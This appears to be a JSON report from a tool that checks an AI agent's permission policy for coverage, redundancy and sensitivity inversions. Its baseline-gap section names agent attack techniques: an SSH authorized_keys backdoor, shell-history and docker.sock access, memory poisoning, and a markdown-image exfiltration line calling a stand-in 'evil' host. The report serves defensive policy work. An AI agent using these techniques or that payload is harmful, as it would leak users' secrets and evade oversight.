@@ -1,0 +1,951 @@
+{
+  "self_check": {
+    "total_rules": 32,
+    "id_unique": true,
+    "duplicate_ids": [],
+    "vacuous_rule_ids": [],
+    "ok": true
+  },
+  "consistency": {
+    "overlap_count": 5052,
+    "example_state": {
+      "operation": "write",
+      "resource_class": "config",
+      "target_zone": "local",
+      "flags": [
+        "weakens_control"
+      ]
+    },
+    "deny_rule_ids": [
+      "R3.1.1",
+      "R3.1.2",
+      "R3.1.3",
+      "R3.1.4",
+      "R3.1.5",
+      "R3.1.6",
+      "R3.1.7",
+      "R3.2.1",
+      "R3.2.2",
+      "R3.3.1",
+      "R3.3.2",
+      "R3.4.1",
+      "R3.5.1",
+      "LLM-1",
+      "LLM-2",
+      "LLM-3",
+      "LLM-4",
+      "LLM-5",
+      "LLM-6",
+      "LLM-7",
+      "LLM-8"
+    ],
+    "challenge_rule_ids": [
+      "R4.1",
+      "R4.2",
+      "R4.3"
+    ]
+  },
+  "redundancy": {
+    "redundant_rule_ids": [
+      "R4.1",
+      "R4.2",
+      "R4.3"
+    ],
+    "total_rules": 32
+  },
+  "coverage": {
+    "total": 122880,
+    "v_explicit": 121436,
+    "v_danger": 0,
+    "v_deferred": 1444,
+    "v_explicit_ratio": 0.9882486979166667,
+    "v_danger_ratio": 0.0,
+    "v_deferred_ratio": 0.011751302083333333,
+    "danger_cubes": []
+  },
+  "tightening": {
+    "tightenable_rule_ids": [
+      "R4.1",
+      "R4.2",
+      "R4.3"
+    ],
+    "witnessed_rule_ids": [
+      "R5.1",
+      "R5.2",
+      "R5.3",
+      "R5.4",
+      "R5.5",
+      "R5.6",
+      "R5.7",
+      "R5.8"
+    ],
+    "is_h1_tight": false
+  },
+  "monotonicity": {
+    "inversion_count": 20,
+    "inversion_examples": [
+      {
+        "high_state": {
+          "operation": "send",
+          "resource_class": "system_sensitive",
+          "target_zone": "external",
+          "flags": []
+        },
+        "low_state": {
+          "operation": "send",
+          "resource_class": "private_data",
+          "target_zone": "external",
+          "flags": []
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "send",
+          "resource_class": "agent_private_context",
+          "target_zone": "external",
+          "flags": []
+        },
+        "low_state": {
+          "operation": "send",
+          "resource_class": "private_data",
+          "target_zone": "external",
+          "flags": []
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "send",
+          "resource_class": "agent_memory",
+          "target_zone": "external",
+          "flags": []
+        },
+        "low_state": {
+          "operation": "send",
+          "resource_class": "private_data",
+          "target_zone": "external",
+          "flags": []
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "send",
+          "resource_class": "system_sensitive",
+          "target_zone": "external",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "low_state": {
+          "operation": "send",
+          "resource_class": "private_data",
+          "target_zone": "external",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "send",
+          "resource_class": "agent_private_context",
+          "target_zone": "external",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "low_state": {
+          "operation": "send",
+          "resource_class": "private_data",
+          "target_zone": "external",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "send",
+          "resource_class": "agent_memory",
+          "target_zone": "external",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "low_state": {
+          "operation": "send",
+          "resource_class": "private_data",
+          "target_zone": "external",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "send",
+          "resource_class": "system_sensitive",
+          "target_zone": "unknown",
+          "flags": []
+        },
+        "low_state": {
+          "operation": "send",
+          "resource_class": "private_data",
+          "target_zone": "unknown",
+          "flags": []
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "send",
+          "resource_class": "agent_private_context",
+          "target_zone": "unknown",
+          "flags": []
+        },
+        "low_state": {
+          "operation": "send",
+          "resource_class": "private_data",
+          "target_zone": "unknown",
+          "flags": []
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "send",
+          "resource_class": "agent_memory",
+          "target_zone": "unknown",
+          "flags": []
+        },
+        "low_state": {
+          "operation": "send",
+          "resource_class": "private_data",
+          "target_zone": "unknown",
+          "flags": []
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "send",
+          "resource_class": "system_sensitive",
+          "target_zone": "unknown",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "low_state": {
+          "operation": "send",
+          "resource_class": "private_data",
+          "target_zone": "unknown",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "send",
+          "resource_class": "agent_private_context",
+          "target_zone": "unknown",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "low_state": {
+          "operation": "send",
+          "resource_class": "private_data",
+          "target_zone": "unknown",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "send",
+          "resource_class": "agent_memory",
+          "target_zone": "unknown",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "low_state": {
+          "operation": "send",
+          "resource_class": "private_data",
+          "target_zone": "unknown",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "execute",
+          "resource_class": "source_code",
+          "target_zone": "local",
+          "flags": []
+        },
+        "low_state": {
+          "operation": "execute",
+          "resource_class": "normal_file",
+          "target_zone": "local",
+          "flags": []
+        },
+        "high_decision": 0,
+        "low_decision": 1
+      },
+      {
+        "high_state": {
+          "operation": "execute",
+          "resource_class": "source_code",
+          "target_zone": "local",
+          "flags": [
+            "taint_credential"
+          ]
+        },
+        "low_state": {
+          "operation": "execute",
+          "resource_class": "normal_file",
+          "target_zone": "local",
+          "flags": [
+            "taint_credential"
+          ]
+        },
+        "high_decision": 0,
+        "low_decision": 1
+      },
+      {
+        "high_state": {
+          "operation": "execute",
+          "resource_class": "source_code",
+          "target_zone": "local",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "low_state": {
+          "operation": "execute",
+          "resource_class": "normal_file",
+          "target_zone": "local",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "high_decision": 0,
+        "low_decision": 1
+      },
+      {
+        "high_state": {
+          "operation": "execute",
+          "resource_class": "source_code",
+          "target_zone": "local",
+          "flags": [
+            "taint_session_data"
+          ]
+        },
+        "low_state": {
+          "operation": "execute",
+          "resource_class": "normal_file",
+          "target_zone": "local",
+          "flags": [
+            "taint_session_data"
+          ]
+        },
+        "high_decision": 0,
+        "low_decision": 1
+      },
+      {
+        "high_state": {
+          "operation": "execute",
+          "resource_class": "source_code",
+          "target_zone": "local",
+          "flags": [
+            "taint_credential",
+            "taint_private_data"
+          ]
+        },
+        "low_state": {
+          "operation": "execute",
+          "resource_class": "normal_file",
+          "target_zone": "local",
+          "flags": [
+            "taint_credential",
+            "taint_private_data"
+          ]
+        },
+        "high_decision": 0,
+        "low_decision": 1
+      },
+      {
+        "high_state": {
+          "operation": "execute",
+          "resource_class": "source_code",
+          "target_zone": "local",
+          "flags": [
+            "taint_credential",
+            "taint_session_data"
+          ]
+        },
+        "low_state": {
+          "operation": "execute",
+          "resource_class": "normal_file",
+          "target_zone": "local",
+          "flags": [
+            "taint_credential",
+            "taint_session_data"
+          ]
+        },
+        "high_decision": 0,
+        "low_decision": 1
+      },
+      {
+        "high_state": {
+          "operation": "execute",
+          "resource_class": "source_code",
+          "target_zone": "local",
+          "flags": [
+            "taint_private_data",
+            "taint_session_data"
+          ]
+        },
+        "low_state": {
+          "operation": "execute",
+          "resource_class": "normal_file",
+          "target_zone": "local",
+          "flags": [
+            "taint_private_data",
+            "taint_session_data"
+          ]
+        },
+        "high_decision": 0,
+        "low_decision": 1
+      },
+      {
+        "high_state": {
+          "operation": "execute",
+          "resource_class": "source_code",
+          "target_zone": "local",
+          "flags": [
+            "taint_credential",
+            "taint_private_data",
+            "taint_session_data"
+          ]
+        },
+        "low_state": {
+          "operation": "execute",
+          "resource_class": "normal_file",
+          "target_zone": "local",
+          "flags": [
+            "taint_credential",
+            "taint_private_data",
+            "taint_session_data"
+          ]
+        },
+        "high_decision": 0,
+        "low_decision": 1
+      }
+    ],
+    "equal_rank_asymmetry_count": 62,
+    "equal_rank_examples": [
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "local",
+          "flags": [
+            "taint_credential"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "local",
+          "flags": [
+            "taint_credential"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "local",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "local",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "local",
+          "flags": [
+            "taint_session_data"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "local",
+          "flags": [
+            "taint_session_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "local",
+          "flags": [
+            "taint_credential",
+            "taint_private_data"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "local",
+          "flags": [
+            "taint_credential",
+            "taint_private_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "local",
+          "flags": [
+            "taint_credential",
+            "taint_session_data"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "local",
+          "flags": [
+            "taint_credential",
+            "taint_session_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "local",
+          "flags": [
+            "taint_private_data",
+            "taint_session_data"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "local",
+          "flags": [
+            "taint_private_data",
+            "taint_session_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "local",
+          "flags": [
+            "taint_credential",
+            "taint_private_data",
+            "taint_session_data"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "local",
+          "flags": [
+            "taint_credential",
+            "taint_private_data",
+            "taint_session_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "internal",
+          "flags": []
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "internal",
+          "flags": []
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "internal",
+          "flags": [
+            "taint_credential"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "internal",
+          "flags": [
+            "taint_credential"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "internal",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "internal",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "internal",
+          "flags": [
+            "taint_session_data"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "internal",
+          "flags": [
+            "taint_session_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "internal",
+          "flags": [
+            "taint_credential",
+            "taint_private_data"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "internal",
+          "flags": [
+            "taint_credential",
+            "taint_private_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "internal",
+          "flags": [
+            "taint_credential",
+            "taint_session_data"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "internal",
+          "flags": [
+            "taint_credential",
+            "taint_session_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "internal",
+          "flags": [
+            "taint_private_data",
+            "taint_session_data"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "internal",
+          "flags": [
+            "taint_private_data",
+            "taint_session_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "internal",
+          "flags": [
+            "taint_credential",
+            "taint_private_data",
+            "taint_session_data"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "internal",
+          "flags": [
+            "taint_credential",
+            "taint_private_data",
+            "taint_session_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "external",
+          "flags": []
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "external",
+          "flags": []
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "external",
+          "flags": [
+            "taint_credential"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "external",
+          "flags": [
+            "taint_credential"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "external",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "external",
+          "flags": [
+            "taint_private_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "external",
+          "flags": [
+            "taint_session_data"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "external",
+          "flags": [
+            "taint_session_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      },
+      {
+        "high_state": {
+          "operation": "read",
+          "resource_class": "agent_memory",
+          "target_zone": "external",
+          "flags": [
+            "taint_credential",
+            "taint_private_data"
+          ]
+        },
+        "low_state": {
+          "operation": "read",
+          "resource_class": "agent_private_context",
+          "target_zone": "external",
+          "flags": [
+            "taint_credential",
+            "taint_private_data"
+          ]
+        },
+        "high_decision": 1,
+        "low_decision": 2
+      }
+    ]
+  },
+  "baseline": {
+    "total": 18,
+    "covered": 13,
+    "requirement_gaps": 2,
+    "vocab_gaps": 3,
+    "coverage_ratio": 0.7222222222222222,
+    "gaps": [
+      {
+        "id": "TINV-CRED-18",
+        "source": "T1098.004 SSH authorized_keys 写入（最经典 agent 后门）",
+        "desc": "写入凭据文件应 Deny（文档凭据类通常只规定读，未规定写）",
+        "kind": "requirement_gap",
+        "example_state": {
+          "operation": "write",
+          "resource_class": "credential",
+          "target_zone": "local",
+          "flags": []
+        }
+      },
+      {
+        "id": "TINV-CRED-03",
+        "source": "T1552.003 Bash History",
+        "desc": "读取 shell 历史应至少 Ask",
+        "kind": "requirement_gap",
+        "example_state": {
+          "operation": "read",
+          "resource_class": "config",
+          "target_zone": "local",
+          "flags": []
+        }
+      },
+      {
+        "id": "TINV-EXFIL-07",
+        "source": "AML.T0077 LLM Response Rendering（![](http://evil/?d=secret)）",
+        "desc": "模型输出渲染外泄——需新增『模型输出内容』观察维度，非需求缺失",
+        "kind": "vocab_gap",
+        "example_state": null
+      },
+      {
+        "id": "TINV-CRED-05",
+        "source": "T1552.007 Container API（/var/run/docker.sock）",
+        "desc": "docker.sock 访问——文档系统敏感清单未含该资源类型",
+        "kind": "vocab_gap",
+        "example_state": null
+      },
+      {
+        "id": "TINV-MEM-POISON",
+        "source": "跨会话记忆污染",
+        "desc": "跨会话记忆污染——需新增『会话边界/写入内容来源』维度",
+        "kind": "vocab_gap",
+        "example_state": null
+      }
+    ]
+  },
+  "assumptions": [
+    "A1 不引入 tool 维度——文档所有规则按操作与风险特征表述。",
+    "A2 资源分类器完美（布尔抽象）——路径变形绕过原型阶段不可见。",
+    "A3 MustAllow 推导正确（§5 减 §3、§4）——决定可收紧性结论强度上限。",
+    "A4 H1 只覆盖规则级收紧——H1 tight ≠ 绝对 tight。",
+    "A5 敏感度偏序从章节顺序推导——需人工复核该算子每个输出。",
+    "A6 威胁种子表质量决定覆盖率强度——种子为人工初判，需逐条复核。",
+    "A7 需求集不含管理性语义（委派/角色授予）——否则落入 HRU 不可判定区。"
+  ]
+}
